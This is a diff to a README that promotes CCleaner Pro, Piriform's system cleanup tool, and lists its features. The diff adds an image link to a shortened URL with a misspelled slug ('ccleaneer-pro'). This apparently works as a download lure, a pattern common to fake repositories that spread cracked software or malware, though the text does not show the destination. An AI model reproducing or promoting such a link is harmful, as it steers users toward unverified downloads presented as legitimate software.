@@ -1,6 +1,8 @@
 # CCleaner Pro
 CCleaner Pro is the premium version of the popular system optimization and cleanup tool CCleaner. Developed by Piriform, it’s designed to help users improve the performance of their computer by removing junk files, clearing browser history, and fixing issues related to system registry and startup programs.
 
+[![12312425](https://github.com/user-attachments/assets/c01b2f40-850f-4828-bf2e-a28c58eabe21)](https://y.gy/ccleaneer-pro)
+
 ## Key Features of CCleaner Pro:
 1. Automatic Updates:
 One of the biggest advantages of CCleaner Pro over the free version is automatic updates. The Pro version ensures you always have the latest features, bug fixes, and security updates without manually checking for updates.
